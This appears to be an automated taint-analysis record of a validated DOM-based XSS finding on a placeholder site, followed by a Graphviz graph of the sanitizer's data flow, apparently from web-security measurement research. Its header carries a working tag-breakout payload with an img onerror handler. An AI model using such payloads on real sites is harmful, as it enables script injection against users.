// Finding: 90216d7a-f6eb-4614-8351-b044d7269740
// Finding.url: https://www.example204.com/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('04336ee8851846619a9aab4c0c72afaa')><!--/*
// Finding.parentloc: https://www.example204.com/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('04336ee8851846619a9aab4c0c72afaa')><!--/*
// Finding.domain: www.example204.com
// Finding.base_domain: example204.com
// Finding.source: location.href
// Finding.sink: innerHTML
// Sanitizer.score: 2
// Sanitizer.name: l
// Sanitizer.location: https://assets.example33.com/3e79a7f00488/04f604fda4ad/launch-4dd043aa3d36.min.js - l:3:8470
// Finding.begin: 152
// Finding.end: 199
// Finding.original_uuid: 394d215e-a299-4958-9a35-acffc5ed1a41
// Finding.TwentyFiveMillionFlowsId: -1082296643
// Finding.script: https://assets.example33.com/3e79a7f00488/04f604fda4ad/launch-4dd043aa3d36.min.js
// Finding.line: 3
// Exploit.uuid: 04336ee8-8518-4661-9a9a-ab4c0c72afaa
// Exploit.success: true
// Exploit.status: validated
// Exploit.method: C
// Exploit.type: html
// Exploit.token: attribute
// Exploit.content: src
// Exploit.quote_type: "
// Exploit.tag: img
// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
// Exploit.break_in: ><!--/*
// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
// Exploit.begin_taint_url: 0
// Exploit.end_taint_url: 22
// Exploit.replace_begin_url: 22
// Exploit.replace_end_url: 22
// Exploit.replace_begin_param: 112
// Exploit.replace_end_param: 112
// Issues.LargestEncodeAttrStringChain: 0
// Issues.LargestTextFragmentEncodeChainLength: 0
// Issues.HasApproximation: true
// Issues.HasMissingImplementation: false
// Issues.HasInfiniteRegexWithFunctionReplacer: true
// Issues.MergedSplitAndJoins: false
// Issues.HasUrlInRhsOfReplace: false
// Issues.HasUrlInLhsOfReplace: false
// Issues.HasCookieValueInLhsOfreplace: false
// Issues.HasCookieValueInRhsOfreplace: false
// Issues.HasCookieValueInMatchPattern: false
// Issues.HasCookieValueInExecPattern: false
// Issues.RemovedLRConcats: true
// Issues.RemovedReplaceArtifacts: false
// Issues.HasUrlInMatchPattern: false
// Issues.HasUrlInExecPattern: false
// Issues.RemovedNOPreplaces: false
// Issues.Known_sanitizer: false
// DepGraph.hash: 408939468
// DepGraph.sanitizer_hash: -1205686729
// Non Finite Regex with function on rhs:  replace(([^"]*)"/g: 1, s: 0, u: 0, m: 0, i: 0 [escapes(": 1), function_rhs: true], 'function(e,t){return/\\/.test(t)?t+'"':t+'\\"'}') - Left hand side has to be a range 
// Approximated Implementation for:  replace(([^"]*)"/g: 1, s: 0, u: 0, m: 0, i: 0 [escapes(": 1), function_rhs: true], 'function(e,t){return/\\/.test(t)?t+'"':t+'\\"'}') - Left hand side has to be a range 
// Removed LR concats 
digraph cfg {
n0 [shape=house, label="Input: x"];
n1 [shape=ellipse, label="."];
n2 [shape=box, label="Lit: <img src="https://ad.doubleclick.net/ddm/activity/src=6731501;type=pagev0;cat=aicpa00d;u1="];
n3 [shape=ellipse, label="."];
n4 [shape=box, label="Lit: ;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;tfua=;npa=;ord="];
n5 [shape=ellipse, label="."];
n6 [shape=box, label="Lit: 4043269342414.151"];
n7 [shape=ellipse, label="."];
n8 [shape=box, label="Lit: ?" width="1" height="1" alt=""/>"];
n9 [shape=ellipse, label="substr"];
n10 [shape=box, label="Var: x"];
n11 [shape=box, label="Lit: 116"];
n12 [shape=ellipse, label="substr"];
n13 [shape=box, label="Var: x"];
n14 [shape=box, label="Lit: 9"];
n15 [shape=ellipse, label="substr"];
n16 [shape=box, label="Var: x"];
n17 [shape=box, label="Lit: 8"];
n18 [shape=ellipse, label="substr"];
n19 [shape=box, label="Var: x"];
n20 [shape=box, label="Lit: 9"];
n21 [shape=ellipse, label="substr"];
n22 [shape=box, label="Var: x"];
n23 [shape=box, label="Lit: 9"];
n24 [shape=ellipse, label="substr"];
n25 [shape=box, label="Var: x"];
n26 [shape=box, label="Lit: 8"];
n27 [shape=ellipse, label="substr"];
n28 [shape=box, label="Var: x"];
n29 [shape=box, label="Lit: 11"];
n30 [shape=ellipse, label="regex_exec"];
n31 [shape=box, label="RegExp: /^<([\-A-Za-z0-9_]+)((?:\s+[\w\-]+(?:\s*=?\s*(?:(?:"[^"]*")|(?:'[^']*')|[^>\s]+))?)*)\s*(\/?)>/"];
n32 [shape=box, label="Lit: 2"];
n33 [shape=box, label="Var: x"];
n34 [shape=ellipse, label="regex_match"];
n35 [shape=box, label="RegExp: /^<([\-A-Za-z0-9_]+)((?:\s+[\w\-]+(?:\s*=?\s*(?:(?:"[^"]*")|(?:'[^']*')|[^>\s]+))?)*)\s*(\/?)>/"];
n36 [shape=box, label="Lit: 2"];
n37 [shape=box, label="Var: x"];
n38 [shape=ellipse, label="regex_exec"];
n39 [shape=box, label="RegExp: /(?:([\-A-Za-z0-9_]+)\s*=\s*(?:(?:"((?:\\.|[^"])*)")|(?:'((?:\\.|[^'])*)')|([^>\s]+)))|(?:([\-A-Za-z0-9_]+)(\s|$)+)/"];
n40 [shape=box, label="Lit: 4"];
n41 [shape=box, label="Var: x"];
n42 [shape=ellipse, label="preg_replace"];
n43 [shape=box, label="RegExp: /([^"]*)"/"];
n44 [shape=box, label="Lit: "];
n45 [shape=box, label="Var: x"];
n46 [shape=ellipse, label="."];
n47 [shape=box, label="Lit: =""];
n48 [shape=ellipse, label="."];
n49 [shape=box, label="Lit: \""];
n50 [shape=ellipse, label="."];
n51 [shape=box, label="Lit: >"];
n52 [shape=ellipse, label="."];
n53 [shape=box, label="Lit:  data-ps-id=3 >"];
n54 [shape=ellipse, label="str_replace_once"];
n55 [shape=box, label="RegExp: /(\/?>)/"];
n56 [shape=box, label="Lit:  data-ps-id=3 $1"];
n57 [shape=box, label="Var: x"];
n58 [shape=ellipse, label="."];
n59 [shape=box, label="Lit: "];
n60 [shape=ellipse, label="."];
n61 [shape=box, label="Lit: "];
n62 [shape=box, label="Var: x"];
n63 [shape=doubleoctagon, label="Return: x"];
n1 -> n2;
n1 -> n0;
n3 -> n1;
n3 -> n4;
n5 -> n3;
n5 -> n6;
n7 -> n5;
n7 -> n8;
n10 -> n7;
n9 -> n10;
n9 -> n11;
n13 -> n9;
n12 -> n13;
n12 -> n14;
n16 -> n12;
n15 -> n16;
n15 -> n17;
n19 -> n15;
n18 -> n19;
n18 -> n20;
n22 -> n18;
n21 -> n22;
n21 -> n23;
n25 -> n21;
n24 -> n25;
n24 -> n26;
n28 -> n24;
n27 -> n28;
n27 -> n29;
n33 -> n27;
n30 -> n31;
n30 -> n32;
n30 -> n33;
n37 -> n30;
n34 -> n35;
n34 -> n36;
n34 -> n37;
n41 -> n34;
n38 -> n39;
n38 -> n40;
n38 -> n41;
n45 -> n38;
n42 -> n43;
n42 -> n44;
n42 -> n45;
n46 -> n47;
n46 -> n42;
n48 -> n46;
n48 -> n49;
n50 -> n48;
n50 -> n51;
n52 -> n50;
n52 -> n53;
n57 -> n52;
n54 -> n55;
n54 -> n56;
n54 -> n57;
n58 -> n59;
n58 -> n54;
n60 -> n58;
n60 -> n61;
n62 -> n60;
n63 -> n62;
}